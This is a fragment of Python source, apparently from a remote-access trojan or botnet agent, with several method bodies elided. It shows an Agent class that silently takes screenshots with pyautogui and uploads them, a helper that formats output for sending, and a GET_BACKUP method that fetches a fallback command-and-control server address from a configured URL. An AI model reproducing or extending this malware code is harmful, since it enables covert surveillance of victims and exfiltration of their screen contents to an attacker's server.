...
class Agent(object):
    ...
    def send_output(self, output, newlines=True):
        ...
        if newlines:
            if isinstance(output , str) ==True:
                output_ += output +"\n"
            elif isinstance(output , bytes) ==True:
    ...
    def screenshot(self):
        ...
        scr33nsh0t = pyautogui.screenshot()
        pic_name = f"{str(uuid.uuid4())}.png"
        scr33nsh0t.save(pic_name)
        
        self.upload(pic_name)
    ...
    def GET_BACKUP(self):
        """ Grabs the backup link for the c2 server  """ 

        try:

            resp = requests.get(f"{config.BACKUP}")

            config.SERVER = resp.text 



        except:
            print ("c&c server is down ")
